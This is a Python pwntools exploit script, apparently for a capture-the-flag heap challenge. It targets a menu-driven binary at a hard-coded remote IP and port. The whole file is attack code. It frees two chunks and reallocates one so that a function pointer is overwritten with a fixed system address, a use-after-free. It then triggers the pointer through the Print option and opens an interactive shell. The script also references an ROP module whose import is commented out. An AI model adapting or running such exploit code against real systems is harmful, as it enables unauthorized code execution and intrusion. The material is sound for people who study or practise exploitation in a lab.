from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "106.75.104.139"
remote_port = 26768

local_addr = "127.0.0.1"
local_port = 1807

pc = "./pwn"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0000000000001081+0x555555554000\n b *0x00000000000011DE+0x555555554000')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def Add(size,content):
	sla('choice:\n','1')
	sla('name : \n',str(size))
	sla('ability : \n',content)

def Delete(idx):
	sla('choice:\n','2')
	sla('Index : \n',str(idx))

def Print(idx):
	sla('choice:\n','3')
	sla('Index :',str(idx))

def hack():
	raw_input()
	system_addr = 0x08048956
	Add(8,'a'.ljust(7,'\x00'))
	Add(16,'a'.ljust(15,'\x00'))
	Add(8,'a'.ljust(7,'\x00'))

	Delete(0)
	Delete(1)

	payload = p32(system_addr)
	payload = payload.ljust(7,'\x00')
	Add(8,payload)

	Print(0)
	p.interactive()
hack()